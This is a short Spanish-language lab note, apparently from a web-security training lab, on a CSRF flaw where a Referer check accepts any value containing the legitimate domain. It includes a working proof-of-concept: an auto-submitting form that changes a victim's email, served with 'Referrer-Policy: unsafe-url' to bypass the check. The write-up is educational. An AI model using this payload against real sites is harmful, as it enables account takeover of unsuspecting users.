# CSRF con validación Referer vulnerable 

Tags: #CSRF #BurpSuite #XSRF 

```bash 
Este lab presenta un fallo en la validación del encabezado Referer que permite llevar a cabo un ataque CSRF. Aunque el servidor intenta bloquear peticiones que provienen de dominios cruzados, su validación es deficiente y permite cualquier valor de Referer que contenga el dominio legítimo en cualquier parte de la cadena.

- unsafe-url: Sirve para una navegación que se efectue despues, el 'Referer' usado va a contener lo que había despues del dominio especificado 

Notas:
	1. Usar Chrome para que funcione el lab 
```

```javascript 
// PoC para cambiar el correo de la víctima, pero no funcionará por tener en la cabecera 'Referer' un dominio externo

<form class="login-form" name="change-email-form" action="https://web.com/my-account/change-email" method="POST">
	<input type="hidden" name="email" value="hacked@hacked.com">
</form>

<script>
	document.forms[0].submit();
</script>


// Lo que se hace es que la cadena que esta en la cabecera 'Referer' contenga la cadena de la web principal sin importar si hay mas texto antes o despues de ella y para ello se logra con la cabecera 'unsafe-url'

File:
/web.original.com    

Head:
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Referrer-Policy: unsafe-url

Body:
<form class="login-form" name="change-email-form" action="https://web.com/my-account/change-email" method="POST">
	<input type="hidden" name="email" value="hacked@hacked.com">
</form>

<script>
	document.forms[0].submit();
</script>
```